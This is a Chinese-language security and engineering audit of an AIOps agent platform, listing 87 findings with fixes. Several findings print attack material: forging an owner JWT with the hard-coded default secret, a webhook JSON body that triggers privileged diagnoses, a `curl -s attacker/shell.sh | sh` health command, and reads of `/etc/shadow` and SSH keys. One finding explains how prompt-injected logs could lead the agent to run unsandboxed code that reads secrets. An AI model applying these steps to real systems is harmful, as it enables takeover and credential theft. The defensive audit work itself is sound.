# AIOps Agent 平台 · 全项目体检报告

> **体检对象**：`/Users/zhangsidong/ai-ops-agent` — 后端 23,979 行 / 210 个 Python 文件，前端 15,725 行 / 55 个文件，另有 Collector、Pi runtime（Node）、部署与脚本。
> **方法**：8 个维度并行审计（23 个 agent），每条发现必须给出「证据（文件:行号）→ 风险 → 业界做法 → 可采纳性 → 建议」；随后对**全部 critical/high 做对抗性复核**（复核员的指令是"尽力证伪"）。
> **产出**：**87 条发现 = 4 critical / 26 high / 44 medium / 13 low**。分维度详情见 [`audit/`](audit/)。

---

## 一、执行摘要

**一句话结论：这是一套「AI 层设计水准明显高于工程与运维水准」的系统。**

**做得好的地方确实是真好。** Agent 核心（[`audit/agent-core.md`](audit/agent-core.md)）里，工具权柄被收敛到**单一目录 + 单一网关**，四条执行路径（Pydantic 原生工具 / Pi 桥接 / MCP Server / MCP Client）全部经过同一套参数校验、scope 校验、策略授权、预算、取消与**强制审计**；「停止等待 ≠ 停止执行」的结算语义、"审计写失败就不执行工具"的 fail-closed、证据校验的自我克制（`complete_answer_verified` 恒为 `False`），这些在同类 Agent 项目里属于上游水平。**这个维度 9 条发现里没有一条 critical。**

**但风险几乎全部在别处。** 87 条发现里，只有 11 条出自 Agent 核心，其余 76 条分布在安全、部署、数据、采集器、工程质量等"传统"层面——**这不是 AI 技术的病，是工程卫生的病。**

**4 条 critical 都是上线阻断级，且都不难修：**

| # | 问题 | 采纳成本 | 为什么是 critical |
|---|---|---|---|
| 1 | **JWT 密钥用的还是源码里的默认值** `dev-secret-change-me-in-prod`，而实例已挂在公网隧道上 | easy | 任何人签一个 `{"sub":"1"}` 就是平台 owner；`User.id` 从 1 自增，枚举即可跨租户接管 |
| 2 | **`.env` 里的真实密钥进过 git 历史，且至今未轮换** | moderate | DeepSeek key、飞书 app secret、verification token 对任何 clone 过仓库的人永久有效 |
| 3 | **飞书 Webhook 零验签、零鉴权** | easy | 任何人可驱动平台用**租户自己的凭据**跑一次带工具的诊断，并把结果投递到攻击者指定的会话 |
| 4 | **业务与平台数据没有任何备份机制** | moderate | 唯一"备份"写在同一个盘上、且只在 alembic 版本变化时触发；单盘故障即计费账本与客户业务数据全量丢失 |

**一个刺眼的对比。** 项目在 AI 层极其坚持 fail-closed —— 审计写不进去就拒绝执行工具。但在平台层却普遍 fail-open：代码沙箱在没有 docker CLI 时**静默降级**为在 API 进程内执行模型生成的代码；`ENCRYPTION_KEY` 未配置时凭据加密**整体变成 no-op**（但程序照常跑）；审计写入失败被 `except` 吞掉；`connector` 类型未知时**静默回退** `LocalConnector`。**同一套代码里，对模型极严，对基础设施极松。**

**好消息是成本结构。** 87 条中发现 40 条标为 `easy`、36 条 `moderate`——绝大多数不是架构级改造，而是"几行配置 + 几十行代码 + 一个定时任务"。

---

## 二、全局统计

| 维度 | critical | high | medium | low | 合计 | 评价 |
|---|---:|---:|---:|---:|---:|---|
| Agent 核心 | 0 | 2 | 5 | 2 | 9 | **架构优秀**，问题是两处静默失效与边界细节 |
| 应用服务与 API | 1 | 3 | 6 | 1 | 11 | 无鉴权 webhook 是致命入口；其余是并发与性能债 |
| 数据模型与迁移 | 0 | 2 | 7 | 2 | 11 | 多租户隔离基本到位，但约束/索引/级联系统性缺失 |
| 安全与权限 | 2 | 4 | 3 | 2 | 11 | **最危急的维度**：密钥卫生几乎是空的 |
| 部署与运维 | 1 | 5 | 5 | 0 | 11 | 无备份、无自愈、无平台自身指标 |
| 工程质量 | 0 | 3 | 5 | 2 | 10 | 零测试、零 CI、锁定被绕过 |
| 前端 | 0 | 3 | 6 | 3 | 12 | XSS 面收得干净，但缺护栏与不可逆操作确认 |
| 采集器与连接器 | 0 | 4 | 7 | 1 | 12 | 设计意图正确，边界校验与信任模型有缺口 |
| **合计** | **4** | **26** | **44** | **13** | **87** | |

---

## 三、方法论与可信度

体检结论要能拿去决策，所以这一步很关键。

**对抗性复核确实推翻了一部分严重度判断。** 4 条 critical 全部 `confirmed`；但有 6 条 high 被复核员下调为 medium，理由都是"问题真实存在，但严重度被夸大或忽略了已有缓解"：

- 「JWT 存 localStorage + 无 CSP」→ medium：当前**没有任何注入入口**（3 处 `v-html` 全经 DOMPurify，唯一另一处是静态常量表），缺的是纵深防御而非可复现接管路径。
- 「沙箱静默降级」「优雅关停被绕过」「Nginx 白名单缺前缀」「collector/exec 只校验登录」「审计写入失败被吞」→ 均下调为 medium。

复核还**发现了审计师漏掉的东西**，其中一条比原发现更值得警惕：

> 已提交的 `HEAD` 里 `renderMd` 是 `markedParser.parse(text)` **原样输出、完全未净化**；DOMPurify 只存在于**未提交的工作区**。也就是说，一旦按 HEAD 重新构建前端，XSS 的严重度应该**升到 high 甚至 critical**。

**没有一条 high 被判定为 refuted**（完全证伪）。复核共产生 11 条修正，全部记录在分维度报告的「对抗性复核」小节里。

---

## 四、横向主题（比单条发现更重要）

单条问题可以逐个修，但下面六个模式会**持续产生新问题**。

### 主题 1：静默失效——本项目的头号疾病（7 处）

同一个模式反复出现：**失败不报错、降级不告警、返回空结果**。

| 位置 | 表现 |
|---|---|
| `search_knowledge_base` | system_id 形状不一致（`"org1-xxx"` vs `"1"`）→ 知识库工具**永久返回"暂无记录"**，且 UI 证据链照常显示引用，形成自相矛盾 |
| 代码沙箱 | 没有 docker CLI 时**静默降级**为在 API 进程内执行模型生成的代码 |
| `ENCRYPTION_KEY` | 未配置时加密变成 no-op，SSH/DB/通知凭据**明文落库**，程序无任何提示 |
| connector 类型 | 未知类型静默回退 `LocalConnector` |
| 审计写入 | 平台层 `except` 吞掉异常（与 AI 层"审计失败就不执行"直接矛盾） |
| 工具状态归一化 | 用**子串**匹配判断 denied，正文里出现"工具访问被拒绝："的成功输出被误判 |
| 前端 | 3 个核心文件未入库，本地能跑、干净 clone **构不出来** |

**最讽刺的一条**：`search_knowledge_base` 这个 bug，项目自己在 `runner.py:317` 的注释里**记录过同类问题的修复**（"旧版用 descriptor id 建目录，检索却查 docs/<数字id>，经验回写从未被命中过"）——回写侧改了，读侧漏改。

### 主题 2："本地能跑" ≠ "仓库可复现"

- `.env` 曾进 git 历史，密钥未轮换；
- 系统级 API 令牌明文硬编码在 `scripts/stack-launcher.sh` 并已提交；
- 前端 SSE 改造的 3 个核心文件不在版本控制内；
- 生产镜像构建**绕过 `uv.lock`**，锁定只在开发机上成立；
- 默认分支不是真实代码（核心架构只存在于工作区）。

这一组的共同后果：**任何"在我机器上是好的"都无法被证伪**。

### 主题 3：fail-closed 哲学没有渗透到平台层

AI 层是 fail-closed 的典范，平台层是 fail-open 的。建议把 AI 层的三句话提升为**全项目原则**：

> 审计失败 → 不执行 / 停止未确认 → 不允许继续 / 引擎不兼容 → 不静默降级

把同样的三问应用到基础设施层：**加密失败要不要继续跑？沙箱不可用要不要继续跑？备份失败要不要告警？**

### 主题 4：多租户校验不一致

- 归档下载端点**忽略租户校验**，而它的 token 会随答案进入第三方 LLM 与审计日志；
- `collector/exec` 只校验登录、不要求 operator 角色，却可下发任意 SQL；
- 系统 token 的 IP 白名单基于**可伪造的** `request.client.host`（反向代理后等于没有）；
- 知识库 system_id 在**读路径与写路径用了两种形状**。

多租户系统的通行做法是"租户键在整条链路上只有一个规范形式"+ CI 里加不变量测试——本项目缺的正是后者。

### 主题 5：零自动化护栏

**0 个自有测试、0 个 CI workflow、无 ruff/mypy/ESLint 配置**（105 处 `noqa` 是死配置，类型注解从不被校验）。前端甚至已经存在 `no-dupe-keys` 级别的真实缺陷（同一对象字面量里重复定义 `totalTokens`）——**ESLint 默认规则一秒就能抓到**。

这次体检靠纯人工阅读就发现了 7 处静默失效；这类缺陷本应有测试拦住。

### 主题 6：不可逆操作缺少确认

- 审批中心「批准执行」**裸点击即对生产下发处置动作**（同仓库对"重启服务"在别处却用了 `Modal.confirm`），而 `_REDIS_CMD_ALLOWLIST` 里含 `FLUSHDB`；
- 全栈无备份、无 restore 演练；
- `alembic --autogenerate` 会生成 **DROP 掉 pgvector 表**的迁移（向量对象不在 metadata 中，`env.py` 没有 `include_object` 兜底）。

---

## 五、行业常用做法 × 我们能否采用

用户第四问"我们可以用吗"的汇总回答。逐条对应见 [`audit/`](audit/) 各文件。

| 主题 | 业界标准做法 | 我们能否用 | 成本 |
|---|---|---|---|
| **密钥管理** | KMS/Vault 注入；非 dev 环境禁止默认值（启动 fail-fast）；`jti` 支持吊销；CI 用 gitleaks 拦默认密钥 | **能，且应当立刻做** | easy |
| **密钥泄漏处置** | 先轮换（视为已泄漏）→ 再 `git filter-repo` 清历史 → 开 push protection | **能**；注意清历史会重写所有 hash，需全组重新 clone | moderate |
| **Webhook 鉴权** | 校验 `X-Lark-Signature`（HMAC）或用 `encrypt_key` 解密；幂等放 Redis 而非进程内 `deque` | **能**，官方 `lark-oapi` 自带 dispatcher | easy |
| **备份** | `pgBackRest`/WAL-G 做 PITR，至少定时 `pg_dump -Fc` + 异地对象存储 + **定期 restore 演练** | **能**；先做"每日 dump + 校验 + 异地"，PITR 等真上生产再补 | moderate |
| **多租户隔离** | 租户键全链路单一规范形式 + scoped manager + CI 不变量测试 | **能**，改一个函数 + 加断言 | easy |
| **凭证字段** | write-only：GET 只回 `configured: true` 或统一掩码；Pydantic `SecretStr` | **能**，项目里 app_secret 已经是这么做的，webhook_url 漏了 | easy |
| **不可逆操作** | 二次确认 + 高风险要求输入资源名（four-eyes）；Terraform apply / ArgoCD sync 皆如此 | **能** | easy |
| **前端令牌** | httpOnly + Secure + SameSite Cookie（SPA 用 BFF），配 CSP 与安全响应头 | **能**；建议先落安全响应头（当周），Cookie 化排后面 | 响应头 easy / Cookie 化 moderate |
| **测试策略** | pytest + 假工具做单元层；录音回放做集成；golden/evals 做行为回归 | **能**；建议只补**高杠杆不变量**（网关 5 条拒绝路径、`stop_confirmed`、预算基线校验），不追覆盖率 | moderate |
| **依赖与构建** | `uv sync --frozen` 进镜像；容器镜像按 digest 固定；CVE 扫描进 CI | **能** | easy |
| **可观测性** | 平台自身暴露 `/metrics` + 告警规则；结构化日志；日志轮转 | **能**；当前只有基础设施层指标，平台自身是盲区 | moderate |
| **Agent 可观测** | OpenTelemetry GenAI 语义约定；评测集 + 回归 | **部分能**；项目已有 runtime_events/审计/证据链，接 OTel 是包装工作 | moderate |
| **自愈** | 容器 `restart: unless-stopped`、readiness/liveness 分离、宿主 systemd 监管 | **能** | easy |
| **Agent 架构（MCP 工具面收敛、权限网关、预算准入、证据克制）** | 与当前主流（工具白名单、capability 授权、人审闸门）一致 | **已经在用，且程度高于平均** | — |

**明确不适用的**：多区域容灾、K8s Operator、服务网格这类重型设施——当前是单机/单栈规模，引入它们属于过度工程。**先把上面的 easy 项做完，收益远大于上重型设施。**

---

## 六、建议的行动顺序

### 今天（4 项，都是"止血"）

1. **轮换全部泄漏密钥**：DeepSeek API key、飞书 app secret + verification token；给 LLM key 设额度上限与用量告警。
2. **注入强随机 `JWT_SECRET`**（≥32 字节），并在 `core/config.py` 加校验：非 dev 且等于默认值 → **启动失败**。代价是历史 token 失效，用户重登一次。
3. **给飞书 Webhook 加验签**（`X-Lark-Signature` 或 `encrypt_key` 解密），删掉"无 token 即放行"的短路，把幂等迁到 Redis。
4. **建一个每日备份**：`pg_dump -Fc` + `mysqldump --single-transaction`，产物加 `sha256` 自检并**落到异机/对象存储**。

### 本周（把 26 条 high 里 `easy` 的清掉）

- 修 `search_knowledge_base` 的 system_id 形状（**改一行，恢复一条被静默关闭的核心能力**）；
- 把 `**os.environ` 从 MCP 子进程环境里删掉，改显式 allowlist；
- 审批按钮加 `Modal.confirm`（高风险要求输入系统名）；
- **把 3 个未入库的前端文件提交**，让 HEAD 与工作区一致；
- 容器加 `restart: unless-stopped` + `stop_grace_period`，补 worker/beat 健康检查；
- 生产镜像改用 `uv sync --frozen`；
- 补 Nginx/前端的安全响应头（CSP、nosniff、X-Frame-Options、Referrer-Policy）。

### 本月（moderate，需要一次小专项）

- `ENCRYPTION_KEY` 配置化 + 存量凭据重加密；
- 采集器密钥改 header 传递 + 加轮换机制 + 采集器侧信任边界收紧（`health_cmd`/`log_path` 不再直达 shell）；
- 清理历史时级联删除 `diagnosis_run_state` / 审计 / 工具输出，并给 `alembic env.py` 加 `include_object` 防误 DROP；
- 前端 SSE 化的收尾 + 令牌存 Cookie（BFF）评估；
- 引入 ruff + mypy + ESLint 并在 CI 里跑起来（先 `--max-warnings=-1` 打底）。

### 季度（架构级）

- 补一组**高杠杆不变量测试** + CI 门禁（这是唯一能阻止主题 1 反复复发的手段）；
- 平台自身可观测性（`/metrics` + 告警 + 结构化日志 + 轮转）；
- 备份升级为 PITR + **做一次真实 restore 演练**；
- 全局 8 线程工具池改按 run/租户舱壁隔离。

---

## 七、87 条发现清单

> 每条给出：标题 · 维度 · 采纳成本。详细证据、业界做法与建议见对应分维度报告。

### Critical — 立即处理

- **运行实例用的是源码里硬编码的 JWT 密钥，任何人可伪造任意用户令牌完成跨租户接管** · `安全与权限` · 采纳成本 *easy*
  `get_current_user`（`core/deps.py:18-24`）只验签名与 `exp`，随后用 `sub` 去数据库取用户、以 `user.org_id` 作为租户边界。`User.id` 是自增主键，从 1 开始枚举即可。攻击者用公开在源码里的密钥签一个 `{"sub":"1","exp":...}` 就是该平台的 owner：可读取全部诊断报告与日志原文、拿到系统/服务的（脱敏前的）配置能力、下发采集器命令、创建系统…
- **`.env` 里的真实密钥已经进了 git 历史，且同一把 key 至今未轮换** · `安全与权限` · 采纳成本 *moderate*
  任何拿到过仓库的人（曾 clone/镜像/fork、CI 缓存、离职同学的本地副本、未来的公开仓库）都持有可用的 LLM API key 与飞书自建应用密钥。DeepSeek key 可被用来烧掉账户余额（无额度护栏，平台自身也没有 per-key 花费告警）；`FEISHU_APP_SECRET` 可换 tenant_access_token，进而以机器人身份读写该应用的群消息、上传文件（`services/notifications…
- **飞书 Webhook 无签名校验、无鉴权，任何人都能驱动面向客户内网的特权诊断 Agent 并指定回发会话** · `应用服务与 API` · 采纳成本 *easy*
  任何能访问该域名的攻击者，构造 `{"header":{"event_type":"im.message.receive_v1"},"event":{"message":{"message_type":"text","content":"{\"text\":\"...\"}","chat_id":"<我的会话>"}}}` 即可让平台用**租户自己的凭据**跑一次带工具的诊断（工具集含只读业务库查询、日志读取、采集器命令、Python 沙…
- **业务与平台数据没有任何备份机制，单盘故障即全量丢失** · `部署与运维` · 采纳成本 *moderate*
  平台 PG 里的 `diagnosis_reports`/`diagnosis_job`/`diagnosis_usage_ledger`/`diagnosis_budget_reservation`/`audit_logs`/`knowledge_memories` 支撑多租户计费与审计；volume 一旦损坏（colima VM 磁盘写坏、`docker volume rm`、磁盘写满后半写）不可恢复，且计费账本缺失无法用重放补齐。

### High — 本周处理

- **search_knowledge_base 因 id 形状不一致永久查不到任何知识库文档（静默失效）** · `Agent 核心` · 采纳成本 *easy*
  100% 复现、无任何日志或异常：只要问题命中 prompt.py:32/45 强制的『含告警代号先 search_knowledge_base』路径，或本轮被判定为 availability_only 而抑制了 knowledge_context 注入（service.py:953-954 明确注释『Knowledge remains available through tools』），agent 就拿不到任何知识库内容，并按 pro…
- **MCP 第三方 server 子进程继承平台全量环境变量（凭据外泄面）** · `Agent 核心` · 采纳成本 *easy*
  任何被配置进来的 MCP server（第三方 SDK、外部厂商提供的 k8s/云平台/工单连接器）都能在启动瞬间读到平台 JWT 签名密钥、数据库连接串、LLM/embedding/rerank API Key、飞书 app secret 与 Celery broker 地址。触发条件仅需运维按文档加一条 MCP_SERVERS 配置（无需任何代码改动），而 MCP server 是被当作半可信外部组件引入的。拿到 jwt_secre…
- **审批中心「批准执行」无二次确认，一次误点直接对生产系统下发处置动作** · `前端` · 采纳成本 *easy*
  审批卡片在 `approval-feed` 里纵向连排、按钮固定在每张卡片右下角（ApprovalsPage.vue:232-250），在滚动/触控板上误点或连点的概率很高，而一次点击就等于一次真实生产变更（重启容器、执行 Redis 命令），没有 dry-run、没有后悔窗口，事后只能靠审计日志回查。影响面是全部已接入系统；在事故处置期间（多人同时操作审批中心）触发概率显著上升。
- **JWT 存 localStorage，且整条部署链路没有任何 CSP 与安全响应头** · `前端` · 采纳成本 *moderate*
  localStorage 中的令牌对任何同源 JS 完全可读，XSS 一旦发生即为「令牌立即外带」，且是长期有效的 Bearer，攻击者可离线长期越权操作生产系统（这正是本平台最敏感的权限）。当前 DOMPurify 用得正确，唯一的动态 v-html 已被净化，所以现状是「可被利用但暂无已知入口」，定级 high 而非 critical；但只要将来新增一处 v-html、或某个 npm 依赖被投毒、或 DOMPurify 出现绕过，就…
- **本次 SSE 改造的核心文件未入库，仓库 HEAD 仍是旧的轮询实现** · `前端` · 采纳成本 *easy*
  两个具体爆点：(1) 一旦有人执行 `git clean -fd`、`git stash`（不带 -u 反而留脏树）或换一台机器，这 3 个未跟踪文件就消失，而 DiagnosisPanel.vue:2-3 与 useDiagnosisChat.js:5 仍然 import 它们，`vite build` 会直接以 `Could not resolve "./answerStream"` 失败，前端无法构建；(2) 仓库 HEAD 与线…
- **飞书 webhook 事件路径完全不校验签名/verification token，可被任意伪造触发一次完整 AI 诊断** · `安全与权限` · 采纳成本 *moderate*
  `POST /feishu/webhook` 带 `{"header":{"event_type":"im.message.receive_v1","event_id":"x"},"event":{"message":{"message_type":"text","content":"{\"text\":\"...\"}","chat_id":"oc_...","message_id":"om_x"}}}` 就能：1) 用平台的 LLM…
- **采集器密钥经 URL query 传输并明文落进访问日志，日志读权限等于采集器全权** · `安全与权限` · 采纳成本 *moderate*
  访问日志通常被轮转、聚拢到 ELK/Loki、被更宽的人群（值班、SRE、第三方日志 SaaS）读取，且这类密钥**没有 TTL、没有轮换机制**（`Collector` 模型只有 `token_hash`，`models/collectors.py:12-21`，删除采集器才能吊销）。拿到这条日志的人即拿到该采集器在当前客户内网的全部能力：`run_readonly_query`（任意 SELECT，见发现 6）、`fetch_log…
- **`ENCRYPTION_KEY` 未配置使凭据加密整体变成 no-op，SSH/数据库/通知凭据明文落库** · `安全与权限` · 采纳成本 *moderate*
  平台的业务价值就是替客户保管内网凭据（MySQL 账号口令、SSH key 路径、飞书 app_secret、redis/kafka 连接），现在这些以明文存在 `systems.infra` / `services.config` 的 JSON 列里。任一环节泄漏——DB 备份被拷走、给审计/BI 开的只读 DB 账号、pg_dump 落到共享盘、云厂商磁盘快照、`logs/` 之外的一次误导出——就直接等于拿到多个客户的生产内网横向…
- **`/systems/{id}/collector/exec` 不要求 operator 角色却可下发任意 SQL，采集器侧只靠关键字黑名单** · `安全与权限` · 采纳成本 *moderate*
  组织内任何非 operator 账号（只读同事、外包、被钓鱼的账号）只要持有效 JWT，就能用 `run_readonly_query` 在**客户内网**的业务库上执行任意单条 SELECT——`SELECT * FROM users`、`SELECT * FROM <支付/订单表>` 全量拖库，脱敏逻辑（`_serialize_rows` / `mask_sensitive_fields`）在这条路径上不生效（它只属于 `data_…
- **自有测试与 CI 门禁已全部移除，且 pytest 依赖被一并从锁定环境删掉** · `工程质量` · 采纳成本 *-*
  平台此后所有改动都无回归网。触发条件是"下一次改提示词/工具/网关"，而历史提交恰恰证明这类改动需要回归网——`51dad11` 的标题是"升级 pydantic-ai + 修 3 个被静默吞掉的启动期 bug"。影响面是整个 backend（27k 行）与 harness/runtime 这两个刚抽出来、从未被测过的核心包；且因为 `pytest` 已不在锁里，即使有人手写测试也跑不起来，退化是自我强化的。
- **生产镜像构建完全绕过 uv.lock，锁定只在开发机上成立** · `工程质量` · 采纳成本 *-*
  `README.md` 声称"保留…依赖锁文件"、`prepare-local-stack.py:25` 也用 `--frozen`，于是"已锁定"成为共识；但真正部署的产物不受锁保护。条件：明天重新 `docker build` 就会得到与今天不同（可能跨大版本）的依赖树——`langfuse 3.x→4.x`、`langgraph 0.2→1.x` 这种升级在本仓历史里都伴随过行为变化（`51dad11` 即因升级 3 个启动期 b…
- **审计写入失败被静默吞掉，与 ARCHITECTURE.md 明示的硬规则相反** · `工程质量` · 采纳成本 *-*
  `data_analysis.dataset_queried` 是"Agent 直接 SQL 读了客户业务库哪张表、取了多少行、SQL 是什么"的唯一留痕。触发条件：审计用的独立 Session 在并发工具调用下拿不到锁、连接超时或事务冲突——此时用户看到的是一次成功的数据查询，审计表里什么都没有，且没有日志、没有 counter、没有告警，事后无法发现，也无法向客户证明"读了多少数据"。影响面是多租户平台最敏感的取证/合规能力，属于"…
- **`query_business_dataset` 的相对日期必然抛 `NameError`，而工具文档正好教模型这么传** · `应用服务与 API` · 采纳成本 *easy*
  Agent 按自己的工具说明传 `"今天"` 就 100% 抛 `NameError`，异常被 `service.py:266-267` 吞成一句 `业务数据集查询失败：name 'today' is not defined` 返回给模型——模型拿不到真实数据，在"今天执行了多少次/失败多少"这类量化问题上有很强的动机改口凭快照猜测，产出看起来合理但错误的运维结论（比直接报错更危险）。凡带相对日期的数据集查询全部不可用。
- **Celery beat 的 15 秒巡检无分布式锁、单事务跨全部租户：重叠执行重复告警，单个系统异常拖垮整批** · `应用服务与 API` · 采纳成本 *moderate*
  (1) 只要一轮耗时 > 15s（跨多租户、逐服务探活，很容易），beat 就会持续堆叠任务副本，而副本在自己的事务里读到的 `last_report_at` 都是旧值 → 判定全部"到期"→ 对同一批系统重复探活、重复 `alert_if_needed`、重复 `run_trend_patrol`，放大 N 倍打向客户内网与被监控系统；(2) 某个系统探活时抛 DB 异常（如唯一约束）会把 Session 置为 `PendingRol…
- **OpenAPI 幂等键靠"全表加载 + Python 比对"实现，且没有唯一约束兜底** · `应用服务与 API` · 采纳成本 *moderate*
  (1) 延迟与内存随该系统历史消息数线性增长——一个每天上报几千条告警的系统，每次上报都要把全部行 hydrate 进 ORM 再丢弃，是典型的可预测性劣化点；(2) 读-判断-写在并发下不成立：两个携带相同 `request_id` 的请求同时到达会**都**判定"不存在"并各自插入，重复告警/重复派发处理，而下游的 `submissions.claim`（`submissions.py:26-28`）用的是数据库唯一约束——同一个仓…
- **`alembic revision --autogenerate` 会生成 DROP 掉 pgvector 表与 `knowledge_memories.embedding` 的迁移，一次性销毁全部 RAG 数据** · `数据模型与迁移` · 采纳成本 *easy*
  触发条件是**日常开发动作**（改完模型跑一次 `alembic revision --autogenerate`），不需要任何恶意输入。一旦生成的迁移被 apply，`knowledge_chunks`（全部文档分块与向量）与 `knowledge_memories.embedding`（全部结构化记忆的向量）直接消失，且 `downgrade()` 只能把**空列/空表**加回来——数据不可恢复。改 `EMBEDDING_DIM` …
- **「清理诊断历史」删除成功后，完整对话历史 / 工具输出 / 审计内容仍留在库里，且与删对话路径行为不一致** · `数据模型与迁移` · 采纳成本 *easy*
  运维（或合规）执行「清理历史」后，被删报告的完整提问、模型回答、工具调用与工具返回内容仍以 `messages_json` / `payload` 原文形式留在库中，且因为父行已删、又没有 FK，**无法通过外键枚举这些孤儿**，只能靠 `report_id NOT IN (SELECT id FROM diagnosis_reports)` 这种手工反连接发现。影响面是全部租户的全部历史诊断。用磁盘和 PII 角度说：报告表清了、体积…
- **容器化部署下代码沙箱静默降级为"在 API 进程内执行 agent 生成的代码"，且沙箱镜像无任何构建入口** · `部署与运维` · 采纳成本 *moderate*
  安全面：一旦走容器化拓扑，被监控系统的日志/指标（可被提示注入污染，`ARCHITECTURE.md:307` 自己承认只做了"低档"外部数据护栏）能够诱导 agent 生成代码，而该代码将以 API 容器身份、**无文件系统与网络隔离**地执行——容器环境里直接可读 `DATABASE_URL`(含密码)、`JWT_SECRET`、`ENCRYPTION_KEY`、`DEEPSEEK_API_KEY`、`FEISHU_APP_SECR…
- **全栈没有任何自愈能力：容器无 `restart` 策略、宿主进程无监管、且整套"生产"跑在一台笔记本上** · `部署与运维` · 采纳成本 *easy*
  任一常见事件都足以造成**需要人工介入才恢复**的停机：宿主重启/Docker daemon 重启（`no` 策略下容器不会回来，`stack-launcher` 也不会自动跑）、macOS 睡眠或合盖、colima VM 内存不足被 OOM（`docker-compose.yml:11` 的注释显示这在 2026-09-22 已真实发生过一次）、单一 worker 进程崩溃（脚本只打印告警，诊断队列就此停摆）。对通过隧道访问的飞书 w…
- **系统级 API 令牌以明文硬编码并已提交进 git 历史** · `部署与运维` · 采纳成本 *easy*
  该令牌是"系统级"凭据（`AIOPS_SYSTEM_CODE='algp'`），持有者可以按 system 身份调用平台 API，绕过用户级鉴权与租户隔离。
- **容器化拓扑下优雅关停链路被 PID 1 与缺失的 `stop_grace_period` 整体绕过，普通队列任务静默丢失** · `部署与运维` · 采纳成本 *easy*
  诊断路径：进程被 SIGKILL 后报告永远停在 `running`，只能靠启动时的 `reap_stale_diagnoses(minutes=1)`（`main.py:94`）收成 `failed` + `resumable=false`——数据不会被写坏（这点设计得对），但用户的诊断成果与已消耗的 token 双双作废，且计费只能按保守预留结算。
- **容器化前端 Nginx 的 API 前缀白名单缺 `/incidents` 与 `/workflows`，核心页面会拿到 SPA 的 HTML 而不是 JSON** · `部署与运维` · 采纳成本 *easy*
  容器化部署（README:27 明确宣称 `deploy/docker-compose.yml` 管理 api/worker/beat/Web）下，控制台首页/消息中心/审批页会静默拿到 `text/html`：axios 解析出的 `data` 是字符串，随后的 `.map`/`.length` 抛错，页面表现为白屏或数据空缺，而 HTTP 状态是 **200**，不产生任何错误日志、也不会被任何健康检查或监控发现。这属于典型的"静默…
- **采集器密钥走 URL query，被 uvicorn 访问日志明文落盘，且永久有效、无轮换** · `采集器与连接器` · 采纳成本 *moderate*
  任何能读到平台 stdout/journald/日志聚合（含镜像、ELK、运维同学的本机 `docker logs`）或反向代理访问日志的人，都拿到了一把长期有效、可跨租户精确认领某个客户系统的 Bearer 凭据。拿它直连 `/ws/collector` 就能：接收该客户系统的全部下行命令与结果（包括 SQL 返回、日志原文），并以该采集器身份下发 `run_readonly_query`/`restart_*`；`manager.c…
- **采集器对平台完全信任：描述符里的 health_cmd / log_path 直达 shell，平台被攻陷即客户内网任意命令执行** · `采集器与连接器` · 采纳成本 *moderate*
  客户安全评审真正会问的问题是"这个 Agent 在我不在的时候能做什么"，而成品答案是"平台让它做什么就做什么"。只要平台侧出现任一写入口——被攻陷的应用进程、SQL 注入/越权 API、被提示注入的 LLM 诊断 Agent（它有服务配置工具链）、或一个内部人员——就可以给某个已连接的远程系统塞一条 `config.health_cmd = "curl -s attacker/shell.sh | sh"`，等采集器下次 `healt…
- **connector 类型未校验 + 未知类型静默回退 LocalConnector，配合绝对路径 log_file 构成采集器主机任意文件读取** · `采集器与连接器` · 采纳成本 *easy*
  只要有一个 operator（或任何能改服务配置的路径）给**远程**系统建了 `connector: "local"`、或把 `ssh` 打成 `"SSH"`/`"docker"`/`"k8s "`，采集器就会用本机语义执行：`fetch_logs` 变成"tail 采集器主机上的任意可读文件"，`/etc/shadow`、`~/.ssh/id_rsa`、`/etc/aiops-collector/run_collector.sh`（…
- **/systems/{id}/collector/exec 只校验登录，只读账号即可在客户生产库执行任意 SELECT、KEYS *、拉日志，且无审计** · `采集器与连接器` · 采纳成本 *easy*
  平台自身的角色模型是分层的（`owner`/`operator`，重启还要 `restart_policy.authorized_user_ids` 名单，`backend/app/services/systems/restart.py:24-34`），但最接近客户数据的那条通道反而只要求"已登录 + 属于本 org"。任何 viewer 账号（或一次泄露的普通用户 JWT）都能：跑 `SELECT * FROM users`、`SEL…

### Medium — 本月规划

- **全局单例 8 线程执行池跨 run/租户共享，排队延迟被上报成工具超时** · `Agent 核心` · 采纳成本 *moderate*
  当同进程内有多个并发诊断（或单个诊断扇出 4 个专家）同时发起慢工具调用时，8 个 worker 被占满，后续 submit 进入无界队列但不开始执行；等待计满 60s 后该工具被判定 timeout，agent 收到『工具超时』并据此改变排查策略或直接下结论——而事实上该工具从未被执行（或稍后才执行并产生晚到结果被丢弃，gateway.py:127-128）。表现为：高负载下诊断质量骤降、超时率与并发数强相关、单租户的慢工具可以拖垮其…
- **重排在截断后的 6 条候选上执行，候选池 16 被浪费，TOP_K 为死配置** · `Agent 核心` · 采纳成本 *easy*
  当真实相关文档的向量相似度排在第 7-16 名（这正是 RERANK_POOL 存在的理由，也是 store.py:98-110 注释里描述过的『短片段向量相似度偏高，把真正正文块挤出 top-k』场景）时，强重排器无力纠正，检索表现为『文档里有却答不出』；启用 rerank API/LLM 的成本（rerank.py:45-65 或 rerank.py:103-120 的一次外部调用）只换来对 6 条候选的内部换序，投入产出严重不符。…
- **工具结果状态归一化用子串匹配，成功输出会被误判为 denied** · `Agent 核心` · 采纳成本 *easy*
  一次成功的 read_logs/search_logs/search_knowledge_base 只要正文包含这两个短语之一，就会被记为 denied：审计链与报告里出现错误的工具状态（可追溯性受损）；该次调用不再计入 evidence_available，导致 apply_evidence_guard 在 evidence.py:75-77 给**本来有真实证据**的回答打上 flagged + reason='evidence_u…
- **Redis 只读白名单放行 KEYS，可在生产 Redis 上造成阻塞性故障** · `Agent 核心` · 采纳成本 *easy*
  Redis 是单线程命令处理模型，`KEYS *` 在百万级 key 的实例上会阻塞所有其它命令（官方文档明确要求在**生产环境**谨慎使用 KEYS）。触发路径完全自然：运维提问『Redis 有哪些 key』『缓存里有没有这个任务的键』，agent 按提示选择 run_redis_command，命中白名单后即下发 KEYS；一次调用就可能让被监控业务 Redis 出现秒级到十几秒的停顿，进而放大为上游超时/雪崩——而这是**平台自己…
- **Agent 核心与 Pi 运行时零自动化测试，fail-closed 不变量无法回归验证** · `Agent 核心` · 采纳成本 *moderate*
  任何一个不变量被误改（例如有人把 execution.py:68 的 `all(r['status']!='unknown' ...)` 放宽、把 pydantic_history 的 reported 校验删掉、把 gateway 的审计前置改成后置）都不会有任何信号，直到线上出现『未确认停止却允许续跑导致重复执行』或『用量基线被绕过导致预算失效』这类难以复现的事故。同时严重拖慢交付：每次改动 agent 核心只能靠真实环境手工回归，…
